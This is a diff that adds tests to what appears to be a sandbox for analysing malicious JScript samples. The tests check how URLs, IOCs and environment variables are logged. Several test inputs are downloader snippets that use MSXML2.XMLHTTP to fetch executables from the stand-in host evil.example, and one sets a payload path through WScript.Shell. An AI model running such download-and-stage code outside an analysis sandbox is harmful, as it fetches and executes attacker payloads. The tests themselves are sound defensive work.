@@ -234,3 +234,63 @@ describe("sample-chosen file names", function() {
 		}
 	});
 });
+
+describe("what reaches IOC.json, urls.json and env_vars.json", function() {
+	this.timeout(90000);
+
+	it("does not take document.location reads as URLs", function() {
+		const run = runSample(
+			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
+			"x.open(\"GET\", \"http://evil.example/stage2.exe\", false); x.send();\n" +
+			"var h = document.location.hostname; var r = document.location.href;\n" +
+			"lib.logResource(\"r1\", \"C:\\\\x.txt\", \"hello\");\n"
+		);
+		try {
+			assert.deepStrictEqual(run.read("urls.json"), ["http://evil.example/stage2.exe"]);
+			assert.strictEqual(run.read("resources.json").r1.latestUrl, "http://evil.example/stage2.exe");
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("writes String-object URLs in IOC values as strings", function() {
+		const run = runSample(
+			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
+			"x.open(\"GET\", new String(\"http://evil.example/strobj.exe\"), false); x.send();\n"
+		);
+		try {
+			const xhr = run.read("IOC.json").find((e) => e.type === "XMLHTTP");
+			assert.strictEqual(xhr.value.url, "http://evil.example/strobj.exe");
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("keeps writing IOC.json after an unserializable or very deep value", function() {
+		const run = runSample(
+			"function nest(n) { var o = {}; for (var i = 0; i < n; i++) o = {c: o}; return o; }\n" +
+			"lib.logIOC(\"Deep\", nest(2400), \"deep\");\n" +
+			"lib.logIOC(\"Big\", {v: BigInt(7)}, \"big\");\n" +
+			"lib.logIOC(\"After\", {ok: 1}, \"after\");\n"
+		);
+		try {
+			const types = run.read("IOC.json").map((e) => e.type);
+			assert.ok(types.includes("After"), JSON.stringify(types));
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("records an environment variable named __proto__", function() {
+		const run = runSample(
+			"var env = new ActiveXObject(\"WScript.Shell\").Environment(\"Process\");\n" +
+			"env.rvalAssign(\"__proto__\", \"C:\\\\stage.ps1\"); env.rvalAssign(\"PAYLOAD\", \"x\");\n"
+		);
+		try {
+			const vars = run.read("env_vars.json");
+			assert.ok(Object.prototype.hasOwnProperty.call(vars, "__proto__"), JSON.stringify(vars));
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+});
